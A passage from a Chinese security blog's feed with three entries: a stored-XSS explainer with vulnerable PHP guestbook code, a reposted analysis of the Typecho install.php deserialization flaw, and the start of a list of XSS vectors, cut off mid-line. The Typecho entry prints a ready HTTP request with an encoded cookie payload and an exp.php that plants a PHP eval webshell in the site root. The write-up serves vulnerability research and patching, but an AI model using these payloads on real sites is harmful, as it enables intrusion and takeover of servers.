        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>存储型XSS是指应用程序直接将攻击者提交的具有恶意代码存储到后台，在显示数据页面被访问时恶意脚本在浏览器因html注入导致页面执行恶意代码从而被攻击者控制浏览器</p><p>持久化攻击，恶意攻击者通过Web界面的可编辑存储功能向服务器插入恶意代码。如留言板，个人信息编辑功能等等。每当被攻击者访问该功能界面都会触发恶意代码。</p><h2 id="存储型XSS的攻击基本流程"><a href="#存储型XSS的攻击基本流程" class="headerlink" title="存储型XSS的攻击基本流程:"></a>存储型XSS的攻击基本流程:</h2><p>a. 比如在某个论坛提供留言板功能，黑客在留言板内插入恶意的html或者Javascript代码，并且提交。</p><p>b. 网站后台程序将留言内容存储在数据中</p><p>c. 然后一个用户也访问这个论坛，并刷新了留言板，这时网站后台从数据库中读取了之前黑客的留言内容，并且直接插入在html页面中，这就可能导致了：黑客留言的脚本本身应该作为内容显示在留言板的，然后此时可能黑客的留言脚本被浏览器解释执行了。。。。</p><h2 id="漏洞代码："><a href="#漏洞代码：" class="headerlink" title="漏洞代码："></a>漏洞代码：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;?php` `if``( isset( $_POST[ ``&apos;btnSign&apos;` `] ) ) &#123;``    ``/``/` `Get ``input``    ``$message ``=` `trim( $_POST[ ``&apos;mtxMessage&apos;` `] );``    ``$name    ``=` `trim( $_POST[ ``&apos;txtName&apos;` `] );` `    ``/``/` `Sanitize message ``input``    ``$message ``=` `stripslashes( $message );``    ``$message ``=` `((isset($``GLOBALS``[``&quot;___mysqli_ston&quot;``]) &amp;&amp; is_object($``GLOBALS``[``&quot;___mysqli_ston&quot;``])) ? mysqli_real_escape_string($``GLOBALS``[``&quot;___mysqli_ston&quot;``],  $message ) : ((trigger_error(``&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;``, E_USER_ERROR)) ? &quot;``&quot; : &quot;``&quot;));` `    ``/``/` `Sanitize name ``input``    ``$name ``=` `((isset($``GLOBALS``[``&quot;___mysqli_ston&quot;``]) &amp;&amp; is_object($``GLOBALS``[``&quot;___mysqli_ston&quot;``])) ? mysqli_real_escape_string($``GLOBALS``[``&quot;___mysqli_ston&quot;``],  $name ) : ((trigger_error(``&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;``, E_USER_ERROR)) ? &quot;``&quot; : &quot;``&quot;));` `    ``/``/` `Update database``    ``$query  ``=` `&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;``;``    ``$result ``=` `mysqli_query($``GLOBALS``[``&quot;___mysqli_ston&quot;``],  $query ) ``or` `die( ``&apos;&lt;pre&gt;&apos;` `. ((is_object($``GLOBALS``[``&quot;___mysqli_ston&quot;``])) ? mysqli_error($``GLOBALS``[``&quot;___mysqli_ston&quot;``]) : (($___mysqli_res ``=` `mysqli_connect_error()) ? $___mysqli_res : false)) . ``&apos;&lt;/pre&gt;&apos;` `);` `    ``/``/``mysql_close();``&#125;` `?&gt;`</span><br></pre></td></tr></table></figure><p>分析与利用：<br>分析代码执行流程：首先把用户输入的数据，使用trim去除字符串首尾处的空白字符（或者其他字符）。之后stripslashes方法返回一个去除转义反斜线后的字符串（’ 转换为 ‘ 等等），双反斜线（）被转换为单个反斜线（）。<br>之后mysqli_real_escape_string对字符串特殊符号n r ‘ “ 等进行转义<br>最终未对用户输入数据进行xss检测编码，直接写入到数据库中，于是造成存储型xss漏洞。</p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Typecho install.php 反序列化导致任意代码执行</title>
      <link href="/2019/10/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2019/10/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h2 id="0x01-Payload"><a href="#0x01-Payload" class="headerlink" title="0x01 Payload"></a>0x01 Payload</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/typecho/install.php?finish=1</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.211.169</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: __typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==</span><br><span class="line"><span class="attribute">Referer:http://192.168.211.169/typecho/install.php</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><p>便会在网站根目录下生产一句话<code>p0.php</code>，密码<code>p0</code></p><p><img src="https://p0sec.net/usr/uploads/sinaimg/006tNbRwly1fkug4jkonij31i80jydir.jpg" alt="img"></p><p><img src="https://p0sec.net/usr/uploads/sinaimg/006tNbRwly1fkug5a04d3j31gu0kqgpg.jpg" alt="img"></p><h2 id="0x02-反序列化可控点"><a href="#0x02-反序列化可控点" class="headerlink" title="0x02 反序列化可控点"></a>0x02 反序列化可控点</h2><p>install.php 288-235行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span> : <span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));</span><br><span class="line">    Typecho_Cookie::delete(<span class="string">'__typecho_config'</span>);</span><br><span class="line">    $db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>], $config[<span class="string">'prefix'</span>]);</span><br><span class="line">    $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">    Typecho_Db::set($db);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第230行获取cookie中的<code>__typecho_config</code>值base64解码，然后反序列化。想要执行，只需<code>isset($_GET[&#39;finish&#39;])</code>并且<code>__typecho_config</code>存在值。</p><p>反序列化后232行把<code>$config[&#39;adapter&#39;]</code>和<code>$config[&#39;prefix&#39;]</code>传入<code>Typecho_Db</code>进行实例化。然后调用<code>Typecho_Db</code>的<code>addServer</code>方法，调用<code>Typecho_Config</code>实例化工厂函数对<code>Typecho_Config</code>类进行实例化。</p><h2 id="0x03-反序列化触发点"><a href="#0x03-反序列化触发点" class="headerlink" title="0x03 反序列化触发点"></a>0x03 反序列化触发点</h2><p>全局搜索<code>__destruct()</code>和<code>__wakeup()</code>：</p><p><img src="https://p0sec.net/usr/uploads/sinaimg/006tNbRwly1fkuc8v4qcoj312s080gna.jpg" alt="img"></p><p>只发现了两处<code>__destruct()</code>，跟进去并没发现可利用的地方。</p><p>继续看<code>Typecho_Db</code>类</p><p>构造方法，Db.php 114-135行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">    $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例化适配器对象</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现第120行对传入的<code>$adapterName</code>进行了字符串的拼接操作。那么如果<code>$adapterName</code>传入的是个实例化对象，就会触发该对象的<code>__toString()</code>魔术方法。</p><p>全局搜索<code>__toString()</code>：</p><p><img src="https://p0sec.net/usr/uploads/sinaimg/006tNbRwly1fkucepcg7hj30xk098765.jpg" alt="img"></p><p>发现三处，跟进，第一个发现并没有可以直接利用的地方。</p><p>跟进<code>Typecho_Query</code>类的<code>__toString()</code>魔术方法，Query.php 488-519行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'action'</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'INSERT INTO '</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">            . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">            . <span class="string">' VALUES '</span></span><br><span class="line">            . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'limit'</span>];</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'DELETE FROM '</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">            $columns = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) &#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                    $columns[] = <span class="string">"$key = $val"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">'UPDATE '</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">            . <span class="string">' SET '</span> . implode(<span class="string">' , '</span>, $columns)</span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第492行<code>$this-&gt;_adapter</code>调用<code>parseSelect()</code>方法，如果该实例化对象在对象上下文中调用不可访问的方法时触发，便会触发<code>__call()</code>魔术方法。</p><p>全局搜索<code>__call()</code>：</p><p><img src="https://p0sec.net/usr/uploads/sinaimg/006tNbRwly1fkufkksc49j314m0aqq5k.jpg" alt="img"></p><p>发现几处，挨个跟进发现<code>Typecho_Plugin</code>类的<code>__call()</code>魔术方法存在回调函数，Plugin.php 479-494行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($component, $args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $component = <span class="keyword">$this</span>-&gt;_handle . <span class="string">':'</span> . $component;</span><br><span class="line">    $last = count($args);</span><br><span class="line">    $args[$last] = $last &gt; <span class="number">0</span> ? $args[<span class="number">0</span>] : <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">self</span>::$_plugins[<span class="string">'handles'</span>][$component])) &#123;</span><br><span class="line">        $args[$last] = <span class="keyword">NULL</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_signal = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">self</span>::$_plugins[<span class="string">'handles'</span>][$component] <span class="keyword">as</span> $callback) &#123;</span><br><span class="line">            $args[$last] = call_user_func_array($callback, $args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $args[$last];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$component</code>是调用失败的方法名，<code>$args</code>是调用时的参数。均可控，但是根据上文，<code>$args</code>必须存在<code>array(&#39;action&#39;=&gt;&#39;SELECT&#39;)</code>，然后加上我们构造的payload，最少是个长度为2的数组，但是483行又给数组加了一个长度，导致<code>$args</code>长度至少为3，那么<code>call_user_func_array()</code>便无法正常执行。所以此路就不通了。</p><p>继续跟进<code>Typecho_Feed</code>类的<code>__toString()</code>魔术方法，Feed.php 340-360行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">self</span>::ATOM1 == <span class="keyword">$this</span>-&gt;_type) &#123;</span><br><span class="line">            $result .= <span class="string">'&lt;feed xmlns="http://www.w3.org/2005/Atom"</span></span><br><span class="line"><span class="string">xmlns:thr="http://purl.org/syndication/thread/1.0"</span></span><br><span class="line"><span class="string">xml:lang="'</span> . <span class="keyword">$this</span>-&gt;_lang . <span class="string">'"</span></span><br><span class="line"><span class="string">xml:base="'</span> . <span class="keyword">$this</span>-&gt;_baseUrl . <span class="string">'"</span></span><br><span class="line"><span class="string">&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line"></span><br><span class="line">            $content = <span class="string">''</span>;</span><br><span class="line">            $lastUpdate = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_items <span class="keyword">as</span> $item) &#123;</span><br><span class="line">                $content .= <span class="string">'&lt;entry&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="string">'&lt;title type="html"&gt;&lt;![CDATA['</span> . $item[<span class="string">'title'</span>] . <span class="string">']]&gt;&lt;/title&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="string">'&lt;link rel="alternate" type="text/html" href="'</span> . $item[<span class="string">'link'</span>] . <span class="string">'" /&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="string">'&lt;id&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/id&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="string">'&lt;updated&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/updated&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="string">'&lt;published&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/published&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="string">'&lt;author&gt;</span></span><br><span class="line"><span class="string">    &lt;name&gt;'</span> . $item[<span class="string">'author'</span>]-&gt;screenName . <span class="string">'&lt;/name&gt;</span></span><br><span class="line"><span class="string">    &lt;uri&gt;'</span> . $item[<span class="string">'author'</span>]-&gt;url . <span class="string">'&lt;/uri&gt;</span></span><br><span class="line"><span class="string">&lt;/author&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br></pre></td></tr></table></figure><p>第358行<code>$item[&#39;author&#39;]</code>调用<code>screenName</code>属性，如果该实例化对象用于从不可访问的属性读取数据，便会触发<code>__get()</code>魔术方法。</p><p>全局搜索<code>__get()</code>：</p><p><img src="https://p0sec.net/usr/uploads/sinaimg/006tNbRwly1fkucxmf4tmj310y09u0uy.jpg" alt="img"></p><p>发现了几处，最终确定<code>Typecho_Request</code>类存在可利用的地方</p><p><code>__get()</code>魔术方法调用<code>get()</code>方法，Request.php 293-309行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">self</span>::$_httpParams[$key]):</span><br><span class="line">            $value = <span class="keyword">self</span>::$_httpParams[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $value = $default;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span> ? $value : $default;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>308行调用<code>_applyFilter()</code>方法，传入的<code>$value</code>是<code>$this-&gt;_params[$key]</code>的值，<code>$key</code>就是<code>screenName</code>。</p><p>跟进<code>_applyFilter()</code>，Request.php 159-171行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">            $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">            call_user_func($filter, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第163行<code>array_map</code>和164行<code>call_user_func</code>均可造成任意代码执行。</p><h2 id="0x04-构造Payload"><a href="#0x04-构造Payload" class="headerlink" title="0x04 构造Payload"></a>0x04 构造Payload</h2><p>Payload：exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type = <span class="string">'ATOM 1.0'</span>;</span><br><span class="line">    <span class="keyword">private</span> $_charset = <span class="string">'UTF-8'</span>;</span><br><span class="line">    <span class="keyword">private</span> $_lang = <span class="string">'zh'</span>;</span><br><span class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addItem</span><span class="params">(array $item)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[] = $item;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="string">'file_put_contents(\'p0.php\', \'&lt;?php @eval($_POST[p0]);?&gt;\')'</span>);</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="string">'assert'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$payload1 = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line">$payload2 = <span class="keyword">new</span> Typecho_Request();</span><br><span class="line">$payload1-&gt;addItem(<span class="keyword">array</span>(<span class="string">'author'</span> =&gt; $payload2));</span><br><span class="line">$exp = <span class="keyword">array</span>(<span class="string">'adapter'</span> =&gt; $payload1, <span class="string">'prefix'</span> =&gt; <span class="string">'typecho'</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</span><br></pre></td></tr></table></figure><h2 id="0x05-修补方法"><a href="#0x05-修补方法" class="headerlink" title="0x05 修补方法"></a>0x05 修补方法</h2><p><strong>删除install.php及install目录</strong></p><hr><p>作者：p0链接：<a href="https://p0sec.net/index.php/archives/114/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/114/</a></p><p>来源：<a href="https://p0sec.net/" target="_blank" rel="noopener">https://p0sec.net/</a></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS的原理分析与解剖</title>
      <link href="/2019/10/10/XSS%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E5%89%96-1/"/>
      <url>/2019/10/10/XSS%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E5%89%96-1/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><p><strong>HTML编码的作用就是将原本能被HTML解析成标签的东西，转换成字符串文本，以文本的形式展现</strong></p><h4 id="支持协议解析的HTML属性"><a href="#支持协议解析的HTML属性" class="headerlink" title="支持协议解析的HTML属性"></a>支持协议解析的HTML属性</h4><p>在HTML中H存在许多支持协议解析的HTML属性，如onclick，onerror，href，src等，类似这种属性是无法通过HTML编码防范XSS攻击，因为浏览器会先解析HTML编码的字符，将其转换为该属性的值，但是该属性本身支持JS代码执行，所以浏览器在HTML解码后，对该属性的值进行JS解析，故会执行相应的代码。</p><p><strong>如</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img scr=1 onerror=alert(&apos;xss&apos;)&gt;  当找不到图片名为1的文件时，执行alert(&apos;xss&apos;)  </span><br><span class="line">&lt;a href=javascrip:alert(&apos;xss&apos;)&gt;s&lt;/a&gt;  点击s时运行alert(&apos;xss&apos;)  </span><br><span class="line">&lt;iframe src=javascript:alert(&apos;xss&apos;);height=0 width=0 